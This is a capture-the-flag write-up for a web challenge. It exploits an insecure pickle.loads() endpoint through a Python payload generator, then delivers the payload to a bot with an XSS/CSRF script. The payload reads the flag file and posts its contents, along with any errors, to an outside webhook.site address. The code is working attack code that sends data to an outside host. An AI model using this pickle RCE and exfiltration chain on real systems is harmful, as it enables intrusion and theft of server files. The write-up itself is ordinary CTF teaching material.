## Initial Reconnaissance
in server/setup.py we see
```python
with open(f"flag_{uuid4().hex + uuid4().hex + uuid4().hex}.txt", "w") as f:
    f.write(FLAG_STAGE_5)
```
which means that `FLAG_STAGE_5` lies in project files, but have long and not guessable name, so we need to check all files to find it.

## RCE. Pickle vulnerability
The target is the `/development/cookie-verify` endpoint. This route insecurely deserializes user-provided data using `pickle.loads()`, which allows for arbitrary code execution.
```python
...
 data = request.json.get('cookie')
 try:
     data = pickle.loads(base64.b64decode(data)) <---
 except Exception as e:
     return "Invalid data :/", 400
...
```


Let's write a python script that generates payload:
```python
import pickle
import base64

code_to_run = """
import os
import requests

flag_file_name = ''
for filename in os.listdir('.'):
    if filename.startswith('flag_'):
        flag_file_name = filename
        break

flag_content = 'Flag file not found!'

if flag_file_name:
    with open(flag_file_name, 'r') as f:
        flag_content = f.read()

requests.post('https://webhook.site/ae28ff10-cd3d-4879-a457-4a9ef68b0362', data=flag_content)

"""

class RCE:
    def __reduce__(self):
        return (exec, (code_to_run,))

pickled_payload = pickle.dumps(RCE())
b64_payload = base64.b64encode(pickled_payload).decode()


print(b64_payload)

```


## XSS and CSRF
Then send it to the bot via XSS and CSRF (`intro web 3, 4`):
```html
<script>
    async function getFlag5() {
        try {
            await fetch('/settings', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({show_development_routes: true})
            });

            await fetch('/development/cookie-verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({"cookie": "gASVLgIAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFgPAgAACmltcG9ydCBvcwppbXBvcnQgcmVxdWVzdHMKCiMgRmluZCB0aGUgcmFuZG9taXplZCBmbGFnIGZpbGUgaW4gdGhlIGN1cnJlbnQgZGlyZWN0b3J5CmZsYWdfZmlsZV9uYW1lID0gJycKZm9yIGZpbGVuYW1lIGluIG9zLmxpc3RkaXIoJy4nKToKICAgIGlmIGZpbGVuYW1lLnN0YXJ0c3dpdGgoJ2ZsYWdfJyk6CiAgICAgICAgZmxhZ19maWxlX25hbWUgPSBmaWxlbmFtZQogICAgICAgIGJyZWFrCgojIElmIHRoZSBmaWxlIHdhcyBmb3VuZCwgcmVhZCBpdHMgY29udGVudApmbGFnX2NvbnRlbnQgPSAnRmxhZyBmaWxlIG5vdCBmb3VuZCEnCmlmIGZsYWdfZmlsZV9uYW1lOgogICAgd2l0aCBvcGVuKGZsYWdfZmlsZV9uYW1lLCAncicpIGFzIGY6CiAgICAgICAgZmxhZ19jb250ZW50ID0gZi5yZWFkKCkKCiMgU2VuZCB0aGUgY29udGVudCB0byB5b3VyIGxpc3RlbmVyCnJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd2ViaG9vay5zaXRlL2FlMjhmZjEwLWNkM2QtNDg3OS1hNDU3LTRhOWVmNjhiMDM2MicsIGRhdGE9ZmxhZ19jb250ZW50KQqUhZRSlC4="})
            });

        } catch (error) {
            fetch('https://webhook.site/ae28ff10-cd3d-4879-a457-4a9ef68b0362', {
                method: 'POST',
                mode: 'no-cors',
                body: 'ERROR: ' + error.toString()
            });
        }
    }
    getFlag5();
</script>
```

Listener receives: `GPNCTF{__some_flag_}`